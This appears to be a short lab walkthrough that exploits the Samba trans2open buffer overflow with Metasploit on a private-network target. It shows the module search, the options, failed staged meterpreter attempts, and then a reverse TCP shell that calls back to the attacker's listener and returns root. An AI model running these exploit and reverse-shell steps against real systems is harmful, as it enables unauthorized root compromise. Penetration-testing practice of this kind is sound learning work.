1. **search trans2open**
```
Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
```
2. **use 1**
3. **options**
```Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.102    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```

4. **set RHOSTS 192.168.1.101**
5. **exploit**
```
[*] 192.168.1.101:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.101:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.101:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 192.168.1.101
[*] 192.168.1.101 - Meterpreter session 1 closed.  Reason: Died
[*] 192.168.1.101:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1017704 bytes) to 192.168.1.101
[*] 192.168.1.101 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.1.101:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1017704 bytes) to 192.168.1.101
[*] 192.168.1.101 - Meterpreter session 3 closed.  Reason: Died
[*] 192.168.1.101:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1017704 bytes) to 192.168.1.101
[*] 192.168.1.101 - Meterpreter session 4 closed.  Reason: Died
^C[-] 192.168.1.101:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
```
staged reverse shell payload is dying, lets try another one
6. **set payload linux/x86/shell_reverse_tcp**
7. **exploit**
```[*] Started reverse TCP handler on 192.168.1.102:4444 
[*] 192.168.1.101:139 - Trying return address 0xbffffdfc...
[*] 192.168.1.101:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.101:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.101:139 - Trying return address 0xbffffafc...
[*] 192.168.1.101:139 - Trying return address 0xbffff9fc...
[*] 192.168.1.101:139 - Trying return address 0xbffff8fc...
[*] 192.168.1.101:139 - Trying return address 0xbffff7fc...
[*] 192.168.1.101:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.1.102:4444 -> 192.168.1.101:32773) at 2023-01-20 13:49:06 +0300

[*] Command shell session 6 opened (192.168.1.102:4444 -> 192.168.1.101:32774) at 2023-01-20 13:49:07 +0300
[*] Command shell session 7 opened (192.168.1.102:4444 -> 192.168.1.101:32775) at 2023-01-20 13:49:08 +0300
[*] Command shell session 8 opened (192.168.1.102:4444 -> 192.168.1.101:32776) at 2023-01-20 13:49:10 +0300
whoami
root
```
8. **done**

